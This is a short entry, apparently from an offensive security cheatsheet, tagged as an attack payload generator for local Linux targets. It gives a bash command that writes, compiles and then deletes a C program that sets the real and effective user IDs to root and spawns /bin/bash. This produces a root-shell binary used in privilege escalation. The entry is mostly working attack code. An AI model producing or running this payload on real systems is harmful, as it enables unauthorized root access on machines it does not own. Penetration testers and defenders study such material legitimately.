# C
% c, shell

## generate shell bash bin
#plateform/linux #target/local  #cat/CODE/SAMPLE #cat/ATTACK/GENERATE_PAYLOAD 

```bash
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c;
gcc pwn.c -o <filename|shell>;
rm pwn.c
```
